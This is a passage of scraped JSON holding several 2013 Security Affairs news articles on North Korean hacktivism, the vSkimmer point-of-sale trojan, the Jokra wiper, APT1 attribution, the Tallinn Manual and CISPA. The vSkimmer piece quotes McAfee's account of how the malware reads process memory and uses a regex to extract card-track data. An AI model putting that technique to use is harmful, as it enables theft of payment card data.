are likely to be successful,\u201d \u201cWhen there are already geo-political tensions this can be cause for serious escalation.\u201d\n\nThe declaration is eloquent,  groups of hacktivists could interfere in an instable context with unpredictable results. Do not forget that also in North citizens are keen computer users equipped with everything needed for an attack. In this hours a groups of hackers belonging to Anonymous claims to have penetrated web site Uriminzokkiri.com, the North Korean-run site based in China, stealing over 15000 user records including names, e-mail addresses, birth dates and hashed passwords.  The attack is part of the operation named #OpNorthKorea that targeted the government websites and more attacks are planned on April 19th and June 25th.\n\nAnonymous hacktivist cell identified as Anonymous_Korea launched a series of successful DDOS attacks on various North Korean state websites on Saturday, March 30th, few hours after the North Koreans issued threatening statement declaring that they had entered into a \u201cstate of war\u201d with South Korea.\n\n\u201cFrom this time on, the North-South relations will be entering the state of war and all issues raised between the North and the South will be handled accordingly\u2026\u201d\n\nWithin websites attacked there are Korean and English language versions of the Democratic People\u2019s Republic of Korea, the North Korean Committee for Cultural Relations and the state-owned airline Air Koryo. The Manilla Bulletin reports that on March 30th also the sites http://www.friend.com.kp/, http://www.naenara.com.kp/ and http://www.airkoryo.com.kp/ were all unreachable.\n\n\n\nThe situation is returning to normal after a series of attacks made impossible to access to many websites during the weekend.\n\nThe hacktivists proved the attack on Uriminzokkiri.com providing details of six accounts, 3 have Korean names and the others seems to be Chinese, meanwhile 4 users have Chinese email addresses, remaining are a Hotmail address and a South Korean address that apparently belongs to KEPCO KDN, a smart-gird systems provider that\u2019s part of the Korea Electric Power Co.\n\nAt the moment there is no evidence that hackers compromised also web and mail servers, following the message of the hacktivists:\n\n\u201cNorth Korean government is increasingly becoming a threat to peace and freedom. Don\u2019t misunderstand us: As well we disagree with the USA government too \u2013 these guys are crooks, USA is a threat to world peace too, and direct democracy (or any kind of democracy) doesn\u2019t exist there.

First we gonna wipe your data, then we gonna wipe your badass dictatorship \u201cgovernment\u201d.\n\n\u201cTo the citizens of North Korea we suggest to rise up and bring these motherfuckers of a oppressive government down!\n\n We are holding your back and your hand, while you take the journey to freedom, democracy and peace.\nYou are not alone.\nDon\u2019t fear us, we are not terrorist, we are the good guys from the internet. AnonKorea and all the other Anons are here to set you free.\u201d\n\n \n\nAnalyzing the events the questions raised are different:\n\nAre these group of hacktivists really independent or there is the concrete risk that they have been infiltrated by governments\u2019 actors?\n\nWorse, is it possible that governments are using hacktivism to hide their offensive?\n\nThe fact that the malware used in the attacks against South Korea is not particularly complex could be a thoughtful strategy to hide real responsible, Schouwenberg confirmed it with following statements:\n\n\u201cNation-state actors may be moving from more to less complex malware in an attempt to make attribution more difficult,\u201d. \u201cAfter all, only top experts can create top quality code, but a lot more people can produce average quality code.\u201d\n\nThe last question is \u2026 which could be the role of hacktivist force in a so complex situation? Will it really destabilize an already precarious situation and how?\n\nCyber warfare for its nature will involve entities, not necessary governments, with which it has never experienced before but that could represent an important player in the arena of the strategists.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyber warfare)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/opnorthkorea", "topic_name": "#OpNorthKorea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/south-korea", "topic_name": "South Korea"}]}, {"news_name": "vSkymmer botnet, a financial malware appears in the underground", "news_link": "https://securityaffairs.co/wordpress/13292/malware/vskymmer-botnet-a-financial-malware-appears-in-the-underground.html", "title": "vSkymmer botnet, a financial malware appears in the underground\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 29, 2013", "body": "The principal reports proposed by various security firm demonstrate a sustained growth of cyber criminal activities fueled by increased offer of underground.\n\nIn the underground it is practically possible to acquire/sell any kind of product and services to realize illegal activities.\n\nThe offer is complete and include programming and hacking services, bulletproof-hosting services, cyber attacks on demand (e.g. DDoS, Spear phishing) and of course any kind of malicious code especially for the creation of powerful botnets.\n\nDespite the number of state-sponsored attacks is increasing in impressive way, underground is mainly referred by cyber criminals that have as primary goal the monetization of fraud scheme.\n\nBotnet products and related services are most requested items in this tumultuous market, in particular cyber criminals demonstrate an increasing interest to banking and payments sectors.\n\nIn the past malicious code such as Zeus and SpyEye create serious problems to financial sector causing substantial losses, in these days a new botnet, named vSkimmer, has been  found in the underground and once again it is the menacing payment world.\n\nThe security expert Chintan Shah at  McAfee security firm wrote in a blog post that during the analysis of some of Russian underground forums found a discussion about a Trojan for sale that is able to steal credit card information from for financial transactions and credit card payments.\n\nvSkimmer agent works on Windows machine, it detects card readers on the victim\u2019s machine and gather all the information from pc sending it to a remote control server encrypting it (Base64).\n\nThe malware collects the following information from the infected machine and sends it to the control server:\n\n \n\n \n\nSecurity community indicates vSkimmer as the successor of the popular Dexter, a popular malware that targeted Point-of-Sale systems to gather card data as it is transmitted during sales flow. The case is not isolated, Dexter is responsible for the loss of nearly 80,000 credit card records and data breach of payment card data of Subway restaurants in 2012 meanwhile several days ago, Group-IB has found a new type of POS malware, \u00abDUMP MEMORY GRABBER by Ree[4]\u201d, written on pure C++ without use of any additional libraries.

This track stores all the card information including the card number.\u201d\n\nFollowing an extract from McAfee post:\n\n\u201cVSkimmer maintains the whitelisted process, which it skips while enumerating the running processes on the infected machine.Once vSkimmer finds any running process not in the whitelist, it runs OpenProcess and ReadProcessMemory to read the memory pages of the process and invokes the pattern-matching algorithm to match the regular expression \u201c?[3-9]{1}[0-9]{12,19}[D=\\\\u0061][0-9]{10,30}\\\\??\u201d)\u201d and extract the card info read by the payment devices. This is done recursively for every process running in the infected machine and not on the whitelist.\u201d\n\n\u201canother example of how financial fraud is actively evolving and how financial Trojans are developed and passed around in the underground community.\u201d\n\nThe malware represents, according to the security community, one of the first examples of malicious code that directly targets card-payment terminals running on Windows machines,  the offer of similar agents in the underground is increasing and their sale systems appear very efficient and able to respond to user\u2019s needs.\n\nA new generation of malware will attract more and more, hordes of criminals looking to profit \u2026 is important to continue to monitor the supply in the black market.\n\n Pierluigi Paganini\n\n(Security Affairs \u2013 Botnet)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ddos", "topic_name": "DDoS"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/group-ib", "topic_name": "Group-IB"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spear-phishing", "topic_name": "spear phishing"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/underground", "topic_name": "underground"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vskimmer", "topic_name": "vSkimmer"}]}, {"news_name": "Multiplatform Wiper widespread in attacks against South Korea", "news_link": "https://securityaffairs.co/wordpress/13154/malware/multiplatform-wiper-widespread-against-south-korea.html", "title": "Multiplatform Wiper widespread in attacks against South Korea\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 25, 2013", "body": "Recently South Korea has been hit by powerful cyber attack malware based, network provided by LG UPlus Corp was hacked by a group calling itself the \u201cWhois Team\u201d.

We do not normally see components that work on multiple operating systems, so it is interesting to discover that the attackers included a component to wipe Linux machines inside a Windows threat.\u201d\n\nThe trojan Jokra runs on Windows XP and 7 invoking an open source remote access manager, named mRemote, that could be used to manage devices on different platforms.\n\nThe malware is able to overwrite the Master Boot Record of the infected machine making impossible the bootstrapping, according McAfee analysis the agent wiped out the MBR on the hard drives overwriting it with either one of these strings:\n\n \n\nMalware analysts at McAfee explained in their post on the topic:\n\n\u201cThe attack also overwrote random parts of the file system with the same strings, rendering several files unrecoverable,\u201d \u201cSo even if the MBR is recovered, the files on disk will be compromised too.\u201d\n\n\u201cThree wipers are packaged as a position-independent executable (PIE) and a fourth as a dynamic-link library (DLL) injection. There are also some differences in regard to the timing.\u201d\n\nAnother interesting behavior observed by researchers is that the malware also try to kill processes related two South Korean antivirus products commercialized by the companies Ahnlab and Hauri.\n\nAvast security firm discovered the alleged source of the attack against Korean banks, it seems started from website of the Korean Software Property Right Council compromised to serve up an iframe that delivered an attack hosted on a third website.\n\nOfficials confirmed that the analysis of IP addresses did not reveal the real responsible for the attacks, due this reason Government of Seoul hasn\u2019t speculated about the event, neither it has blamed North Korea, the situation is very complex and cyber attacks observed on this day may have been triggered by independent groups of hackers or by other states interested in exacerbating tensions in the area.\n\nWho is responsible for the attacks? \n\nPierluigi Paganini\n\n(Security Affairs \u2013 Malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/jokra", "topic_name": "Jokra"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/south-korea", "topic_name": "South Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/trojan", "topic_name": "Trojan"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/whois-team", "topic_name": "Whois Team"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wiper", "topic_name": "Wiper"}]}, {"news_name": "NATO works to define rules for cyber warfare", "news_link": "https://securityaffairs.co/wordpress/13051/cyber-warfare-2/nato-works-to-define-rules-for-cyber-warfare.html", "title": "NATO works to define rules for cyber warfare\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "March 21, 2013", "body": "Recent explosion of cyber attacks worldwide demonstrating the difficulty to maintain order and stability in the cyberspace, within individual states and among the states themselves. Deterrence strategies adopted by almost all countries are inadequate, cyber warfare need a totally new approach that exceed geopolitical order to mitigate the explosion of cyber threats in the fifth domain.\n\nThe absence of roles in the cyber space, even a globally recognized definition of cyber weapon, has caused a cyber arms race, the majority of governments are currently working to improve their cyber capabilities and this is bringing to a fragmentation of the power, cyber warfare is significantly influencing the defense strategies of every governments requesting a review of decisional processes.\n\nA new concept of cyber diplomacy is growing, it is mandatory to work for a global collaboration inter states to prevents that cyber threats will create serious damages to a global economies. The cyber warfare scenario is rapidly evolving and governments must align their strategies working to the definition of a cyber rules globally recognized and accepted.\n\nAn International Group of Experts is trying to define this set of rules, formalizing their effort in an handbook that is going to be published later this week. The manual titled \u201cThe Tallinn Manual on the International Law Applicable to Cyber Warfare\u201d provides a study on how extant international law norms could be applied to cyber warfare.\n\nNATO Cooperative Cyber \u200b\u200bDefense Center of Excellence has sustained the drafting of the document, it tries to clarify the position of the states in the cyberspace defining jurisdiction, control and legal responsibilities.\n\n\u00abA State bears international legal responsibility for cyber operation attributable to it and which constitutes a breach of an international obligation.\u00bb\n\nThe experts provided a legal definition for a concept such as a cyber attack and a cyber weapon, following an abstract from the first draft release:\n\n\u00abA cyber attack is cyber operation, whether offensive or defensive, that is reasonably expected to cause injury or death to persons or damage or destruction to objects\u00bb\n\nThe manual provides detailed specification on targets, highlighting the duty of care during attacks on dam, dykes and Nuclear Electrical Generating Stations, and the needs to preserve children, journalists, medical and religious personnel. In cyber warfare, the context is fundamental to introduce the concept of cyber weapons, and experts have approached it defining the \u2018Means\u2019 of cyber warfare that are cyber weapons and their associated cyber systems.\n\nCyber weapons are cyber means of warfare that are by design, use, or intended use, capable of causing either injury to, or death of, persons. The \u2018Methods\u2019 of cyber warfare are the cyber tactics, techniques and procedures, by which hostilities are conducted. An example of Means and Methods could be provided referring to a DDoS attack conducted using a Botnet. In this case the botnet is the \u2018means\u2019 of cyber warfare while the DDoS attack is the \u2018method\u2019.\n\n\n\nThe handbook  also states two fundamental concepts:\n\n\u201cEveryone was seeing the Internet as the `Wild, Wild West,'\u201d U.S. Naval War College Professor. \u201cWhat they had forgotten is that international law applies to cyberweapons like it applies to any other weapons.\u201d Michael Schmitt, the manual\u2019s editor, declared during an interview :\n\nThe document would be an reference as military lawyers worldwide that face with use of cyber tool for warfare purpose. An interesting consideration raised by the document is related to the possibility to identify cyberwar crimes exactly as in ordinary warfare doctrine, to provide an example of a cyberwar crime we can consider the launching of a cyberattack from a neutral nation\u2019s computer network, it is forbidden exactly in the same way happen when hostile armies march through a neutral country\u2019s territory.\n\nNew and future conflicts will involve new actors in the geopolitical scenarios such as independent hackers, state sponsored hackers, cyber criminals and cyber terrorists that could influence the delicate balance. The battlefield is changed, the conflicts are primary conduced in virtual and immaterial global network in which concept of time is changed because the offence is instantaneous and unpredictable. Conflicts have asymmetric nature and the element of surprise is crucial causing the need to totally review of concept of deterrence.\n\nConcepts of self-defense and pre-emptive strike are issue debated for a long during the drafting of the manual,  due the immateriality of cyberspace and instantaneity of cyber threats it is not applicable an ordinary military conduct. Discover an actor within internal networks is quite different to find an enemy that violates country borders.\n\nThe concept of enemy must be totally reviewed and with him the conditions necessary to its identification.\n\nThe manual is a first step of a long journey \u2026 but it has an extraordinary importance.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyber warfare)\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-capabilities", "topic_name": "cyber capabilities"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/nato", "topic_name": "NATO"}]}, {"news_name": "S.

Don\u2019t forget also that North Korea has capabilities that also include chemical and biological weapons.  A defector has declared that North Korea has increased its cyber warfare unit to staff 3,000 people and it is massive training its young prodigies to become professional hackers.\n\nIntelligence sources in South Korea believe that the Nation has a large a cyber force that responds to the command of the country\u2019s top intelligence agency, the General Reconnaissance Bureau.\n\nThe Reconnaissance Bureau of the General Staff Department is responsible for collecting strategic, operational, and tactical intelligence for the Ministry of the People\u2019s Armed Forces, and this special units are responsible of the cyber attacks conducted in the last years against foreign countries like South Korea. The US military officials have reported to the House of Representatives Armed Services Committee that North Korea has large conventional military, has developed a worrying nuclear weapons programs, acquiring new capabilities in ballistic missiles sector and improving cyber warfare techniques.\n\nAccording the revelation of Army General James Thurman, the commander of US Forces Korea, the government of Pyongyang is massive investing in cyber warfare capabilities, recruiting and forming high skilled team of hackers. The groups will could be engaged in offensive cyber operation against hostile government and in cyber espionage activities.\u201d\n\nAccording South Korea intelligence, the North cyber units are responsible for large-scale cyber attacks against the country occurred in 2009 and March 2011.\n\nOn the other side South Korean military set up the special cyber command in 2010 and established a cyber warfare school in 2012 with Korea University.\n\n\u201cSouth Korea is an IT superpower with good infrastructure but remains relatively vulnerable to hacking,\u201d said Park Soon-Tai, manager of the agency\u2019s hacking response team.\n\nThe training program was launched to increase the cyber capabilities of the country and to respond to  continuous  cyber attacks that hit South Korea. The Korea Internet Security Agency recorded 40,000 cases of cyber attacks from foreign and domestic sources in 2012, up from 24,000 in 2008.\n\nThe South\u2019s military has also established  a special alert level system dubbed Infocon that reflects the current likelihood of an imminent cyber attack, the Infocon level passed from five to four due the tension in Korean area, a level defined by South Korea\u2019s defense minister as a \u201cgeneral threat.\u201d\n\nCertainly what has been observed is just the beginning, the dispute between the two Koreas in cyber space involves, and will involve, an increasing number of states with unforeseeable consequences.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Cyber warfare)\n\n \n\nS.

The numerous initiatives conducted by US Government to improve cyber capabilities are not sufficient to face with sophisticated cyebr attacks by hostile countries, the report remarks that Defense Department \u201cis not prepared to defend against these threats\u201d and its effort leak of a proper coordination, the document also alert central authorities on a \u201cfragmented\u201d dispersion of commitments.\n\n\u201cCurrent DoD actions, though numerous, are fragmented. Thus, DoD is not  prepared to defend againstthis threat DoD red teams, using cyber attack tools which can be downloaded from the Internet, are very successful at defeating our systems The study by the Defense Science Board urges the intelligence community to maintain the threat of a nuclear strike as a deterrent to a major cyberattack.\u201d\n\n\u201cDoD needs to take the lead and build an effective response to measurably increase confidence in the IT systems we depend on (public and private) and at the same time decrease a would-be attacker\u2019s confidence in the effectiveness of their capabilities to compromise DoD systems\u201d \u201cthe relative ease that our Red Teams have in disrupting, or completely beating, our forces in exercises using exploits available on the Internet; and the weak cyber hygiene position of DoD networks and systems\u201d\n\nThe statements are shocking,  you do not need sophisticated computing platforms to hit the country in its vital centers, the technologies are readily available from the Internet. In various occasion cyber warfare experts alerted on the possibility that a conventional warfare operation could be integrated by a cyber offensive, a valuable option that could allow attackers to defense capabilities of adversary.\n\nTo describe cyber capabilities of attackers is has been defined the following threat hierarchy, it takes into account level of skills and breadth of available resources:\n\n\n\nThe report alerted on the capabilities of US militias to respond to a joint attack that could adopt conventional weapon and cyber tools to create large damage to the country. The document try to draw a scenario of a global cyber conflict in which skilled adversaries could crash national networks, hit critical infrastructures, corrupt data.\n\n\u201cU.S. guns, missiles, and bombs may not fire, or may be directed against our own troops. Resupply, including food, water, ammunition, and fuel may not arrive when or where needed. Military commanders may rapidly lose trust in the information and ability to control U.S. systems and forces. Once lost, that trust is very difficult to regain.\u201d\n\nThe report sustains the thesis that \u201cwith present capabilities and technology it is not possible to defend with confidence against the most sophisticated cyber attacks\u201d, the document states that the process of improvement of cyber capabilities could take years for the Department. The principal need is the building of an effective response to the cyber threats that must include elements of deterrence, mission assurance and offensive cyber capabilities.\n\nOffensive cyber capabilities are fundamental to preserve cyber security of US, the report suggests  establishing a well-defined response strategy for cyber attacks  contemplating also the use offensive preemptively cyber operations.\n\nAnother aspect highlighted by the report is the necessity of hardware/software qualification for all those components produced in countries having high-end cyber-capabilities such as Russia and China, the fears is that these governments could distribute systems and application that could include a backdoor or any other mechanism to interfere with hosting environment.\n\nThe report agree on the impossibility to protect any military system, it propose to isolate critical environments reserving for them most advanced defensive measures.\n\nAs reported above nuclear option remains ultimate response for deterrence strategy,  but it is absolutely necessary that Government is able to ensure security of high critical system also within a full-spectrum, cyber-stressed environment.\n\n\u201cNuclear weapons would remain the ultimate response and anchor the deterrence ladder. This strategy builds a real ladder of capabilities and alleviates the need to protect all of our systems to the highest level requirements, which is unaffordable for the nation. Similar to the prior argument regarding the cyber resiliency of the nuclear deterrent, DoD must ensure that some portion of its conventional capability is able to provide assured operations for theater and regional operations within a full-spectrum, cyber-stressed environment.\u201d\n\nThe report also raises questions about whether the command-and-control systems for U.S. nuclear weapons are evaluated sufficiently for vulnerabilities to cyber attack and sabotage. A senior defense official said the Pentagon \u201chas great confidence that our nuclear command, control and communications systems are secure, reliable and resilient.\u201d\n\nThe great question is, how much cost this?\n\nDespite it is not simple to define exactly the needed amount of money necessary neither the timeline, the task force that wrote the report attempted to predict the ranges of cost and approximate time frames for which these recommendations could be accomplished as shown in the following table:\n\n\n\nIt\u2019s clear that there is no time to lose.\n\nPierluigi

We have observed the DOTA persona emailing someone with the username mei_qiang_82. The name \u201cMei Qiang\u201d (\u6885\u5f3a) is a reasonably common Chinese last/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several \u201cMei Qiang\u201d identities online that claim a birth year of 1982, making attribution to an individual difficult.\n\nFortunately, we can use SH\u2019s email address to connect him to a number of Websites and forums on which he registered and contributed using that address. Many of these accounts reveal details that reinforce SH\u2019s link to the \u201cmei_qiang_82@sohu.com\u201demail address and APT1 affiliation, such as SH offering to write Trojans for money, his involvement with malicious Windows kernel research (incidentally, also commented on by \u201cgreenfield\u201d, possibly UG), and more recently, being local to Shanghai\u2019s Pudong New Area.\u201d\n\nNow the question is \u2026 are we really sure that Chinese hackers are involved in the attacks? The evidences collected tell us only that the attacks are moved from Pudong area, nothing else. Other states such as Iran, Pakistan could be responsible for the attacks and Chinese governments is aware of these campaign IN MY OPINION. All these governments have strict relationship with government of Beijing that isn\u2019t interested to stop them \u2026 the enemies of your enemies are your friends. It is also true that China has the highest number of compromised servers in the world, this means that a foreign state could be exploited its networks to conduct attacks originated from Chinese soil, but I find it very hard due the strict controls of governments on internal networks.\nAnother factor to consider is the great cyber skills of Chinese state sponsored hackers members of Unit 61398, how is it possible that the used their own IP address range?\n\nVery often things that seem obvious hiding unimaginable reality \u2026\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/apt1", "topic_name": "APT1"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hbgary", "topic_name": "HBGary"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mandiant", "topic_name": "Mandiant"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pla", "topic_name": "PLA"}]}, {"news_name": "Mandiant report on APT1 & China\u2019s cyber espionage units", "news_link": "https://securityaffairs.co/wordpress/12452/intelligence/mandiant-report-on-apt1-chinas-cyber-espionage-units.html", "title": "Mandiant report on APT1 & China\u2019s cyber espionage units\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 19, 2013", "body": "Early this month it was spread the news regarding a sophisticated cyber espionage campaign against principal media agencies in US, included NYT and Washington Post, the hackers have tried to compromise the email account of journalists to steal sensitive information. The campaign appeared very aggressive, the hackers have tried to infiltrate the network of the journal using 45 instances of targeted malware, as revealed by forensics analysis conducted by Mandiant security firm.\n\nMandiant experts observed that the hackers began work, for the most part, at 8 a.m. Beijing time operating for a standard work day, but the group of hackers has also attacks stopped for a couple of weeks periodically.\n\nThe New York Times reported:\n\n\u201cThe hackers tried to cloak the source of the attacks on The Times by first penetrating computers at United States universities and routing the attacks through them, said computer security experts at Mandiant, the company hired by The Times. This matches the subterfuge used in many other attacks that Mandiant has tracked to China.\u201d\n\nFew weeks after The Mandiant\u00ae Intelligence Center\u2122 released an shocking report that reveals an enterprise-scale computer espionage campaign dubbed APT1.  The term APT1 is referred to one of the numerous cyber espionage campaign that stolen the major quantity of information all over the world.\n\n\n\nThe evidences collected by the security experts link APT1 to China\u2019s 2nd Bureau of the People\u2019s Liberation Army (PLA) General Staff Department\u2019s (GSD) 3rd Department (Military Cover Designator 61398) but what is really impressive is that the operations have been started in the distant 2006 targeting 141 victims across multiple industries.\n\n\n\nFollowing the info provided on the famous \u201cUnit 61398:\n\nDuring the attacks the attackers have took over APT1 malware families and has revealed by the report APT1\u2032s modus operandi (tools, tactics, procedures) including a compilation of videos  showing actual APT1 activity.\n\nThe Mandiant has also identified more than 3,000 indicators to improve defenses against APT1 operations  and is releasing a specific document that will address them  including APT1 indicators such as domain names, IP addresses, and MD5 hashes of malware.\n\nAPt1 has systematically stolen hundreds of terabytes of data from victim organizations and has demonstrated the capability and intent to steal from dozens of organizations simultaneously.\n\n\n\nAPT1 is a persistent collector,  once APT1 has established access, they periodically access to victim\u2019s network stealing sensitive information and intellectual property for a long time, typically maintaining access to victim networks for an average of 356 days.\n\nThe longest time period APT1 maintained access to a victim\u2019s network was 1,764 days, or four years and ten months.\n\nIn the precious document the Mandiant will also propose:\n\nMandiant managers have decided to make an exception to its traditional non-disclosure policy due the risks related to the imposing cyber espionage campaign and its impact on global economy, many states and related industries are victims of the offensive.\n\nFollowing a meaningful declaration of the security firm:\n\n\u201cIt is time to acknowledge the threat is originating from China, and we wanted to do our part to arm and prepare security professionals to combat the threat effectively.  The issue of attribution has always been a missing link in the public\u2019s understanding of the landscape of APT cyber espionage.  Without establishing a solid connection to China, there will always be room for observers to dismiss APT actions as uncoordinated, solely criminal in nature, or peripheral to larger national security and global economic concerns.

Dutch Ruppersberger (D-Md.) before the US House next week.\n\nThe controversial cyber bill raised an heated debate, the act will force any company to give away all the user\u2019s data it collects if asked by the government and the bill that plan to introduce next week will be identical to the version of CISPA that passed the House last spring.\n\nThe decision to repeat the bill has been conditions by recent events on cyber espionage campaign against media agencies such as The New York Times and The Wall Street Journal, or by the cyber attacks against the Federal Reserve systems government departments such as the US Department of Energy.\n\nUS authorities are aware on a possible wave of attacks against the infrastructures of the countries,\n\nJanet Napolitano, head of Homeland Security recently warned that a \u201ccyber 9/11\u201d, which could cripple critical infrastructures such as telecommunication, water, electricity and gas, may be \u201cimminent\u201d.

There are things we can and should be doing right now that, if not prevent, would mitigate the extent of damage,\u201d  Napolitano said.\n\nUS governments has understood the destructive power of a cyber attack, equivalent to a conventional military attack, but much more subtle and difficult to identify in time.\n\nA cyberattack could shut down a telecommunication systems or interrupt the financial services, event that could cause the block of vital operation of a country. The chairman of the House Intelligence Committee Mike Rogers declared that 95 percent of private sector networks are vulnerable, and most have already been hit, a worrying scenarios that reveal the fragility of IT infrastructure of the nation. Rogers was responsible for introducing the Cyber Intelligence Sharing and Protection Act (CISPA) in November 2011, he confirmed that hackers have increase their pressure on US infrastructures and pointed to China and Iran, considered the most active countries against US.\n\n\u201cThey\u2019re taking blueprints back, not just military documents, but civilian innovation that companies are gonna use to create production lines to build things,\u201d \n\n\u201cThey\u2019re stealing that, repurposing it back in nations like China, and competing in the international market.\u201d Rogers told CBS that the US government has essentially \u201cset up lawn chairs, told the burglars where the silver is \u2026 and opened the case of beer and watched them do it\u201d. Rogers said.\n\nRoger is a deep sustainer of CISPA:\n\n\u201cShare information about threats online,\u201d \u201cThe senior leadership in the intelligence community said that they think that we can stop 90 percent of our problems by just sharing classified cyberthreat information.\u201d he said.\n\nThe news is not surprising, security has been neglected for too long with devastating consequences, together technological progress has lowered the level of knowledge required to conduct a cyber attack. It\u2019s changed the battlefield, the actors have changed and the access to cyber arsenals has become too easy, in this context it is only a matter of time before a cyber attack can cause serious damage with unpredictable consequences on the civilian population.\n\nAn incredible amount of cyber attacks daily hit US networks and their data, with the result that personal information, intellectual property and trade secrets are stolen and most of the time without a culprit is identified.\n\nTargeted by attackers are government agencies, private companies and public utilities, nothing is considerable secure, some row estimation qualify the value of information hacked at up to $US400 billion every year, an impressive figure that led us to understand the weight of the security in an economic context.\n\n\n\nAs declared in many occasions, many companies are reluctant to admit they\u2019ve been attacked, to keep a competitive edge and avoid loss of reputation, fortunately US governments and also EU states are working to the definition of a cyber bill that oblige victims of data-breach.\n\nDespite US continuously accuses Government of Beijing for cyber attacks, Chinese authorities reply sustaining that China is also targeted by an intense cyber offensive, receiving 13 percent of all cyber attacks on global scale.\n\nChina \u2018s ambassador to Australia, Chen Yuming, previously told ABC\u2019s:\n\n\u201cThere are hundreds of thousands of computers in Chinese government agencies which have been attacked by cyber attackers from overseas sources.\u201d \n\nCyber security is a shared need, every government has detected an increased number of cyber attacks against its infrastructure, let\u2019s consider the recent data proposed on UK, More than 120,000 cyber-attacks are launched every day against computers in Britain, According security experts the overall 44million attacks a year against English system are estimated to cost the country up to \u00a327billion.\n\nThe definition of a proper cyber strategy that must be improved day by day to mitigate cyber threats is became a primary responsibility for any government, for sure works of authorities will impact user\u2019s perception of internet that probably will be very different from that to which we are accustomed, CISPA could be a first step of the dreaded change.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cispa", "topic_name": "Cispa"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/federal-reserve", "topic_name": "Federal Reserve"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/government-networks", "topic_name": "Government Networks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}]}, {"news_name": "From CISPA to Obama\u2019s executive order on national cybersecurity", "news_link": "https://securityaffairs.co/wordpress/12375/laws-and-regulations/from-cispa-to-obamas-executive-order-on-national-cybersecurity.html", "title": "From CISPA to Obama\u2019s executive order on national cybersecurity\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "February 15, 2013", "body": "During the last days worldwide internet community expressed great concern on the possibility of a reintroduction of The Cyber Intelligence Sharing and Protection act (CISPA)  before the US House by House Intelligence Committee Chairman Mike Rogers (R-Mich.) and ranking member Rep. Dutch Ruppersberger (D-Md.). The controversial cyber bill raised an heated debate, supporters believe it is an act to ensure the security of the national infrastructures meanwhile opponents sustain that it represents a threat to citizens\u2019 privacy because the act will force any company to give away all the user\u2019s data it collects if asked by the government. The decision to repeat the bill has been conditioned by recent events of cyber espionage campaign against US media agencies such as The New York Times and The Wall Street Journal and by the cyber attacks against many US organizations and agencies such as the Federal Reserve, U.S. banking and Department of Energy. Rogers argued vigorously the necessity to take action to mitigate continuous cyber offensives against  US networks to avoid serious damages for the nation.\n\n \u201cThis is clearly not a theoretical threat \u2013 the recent spike in advanced cyber attacks against the banks and newspapers makes that crystal clear,\u201d  \u201cAmerican businesses are under siege,\u201d  \u201cWe need to provide American companies the information they need to better protect their networks from these dangerous cyber threats.  It is time to stop admiring this problem and deal with it immediately,\u201d  \u201cWe\u2019re talking about exchanging packets of information, zeroes and ones, if you will, one hundred millions times a second. So some notion that this is a horrible invasion of content reading is wrong. It is not even close to that.\u201d,  Rogers said.\n\nThe bill has been prepared to respond to needs of intelligence agencies and law enforcement to collect information on cyber attacks and data breaches to allow investigation on cyber threats and to ensure the security of networks. The bill would also allow the government to provide classified data on cyber threats to private firms, and protect them from legal action in the course of sharing private information, this is 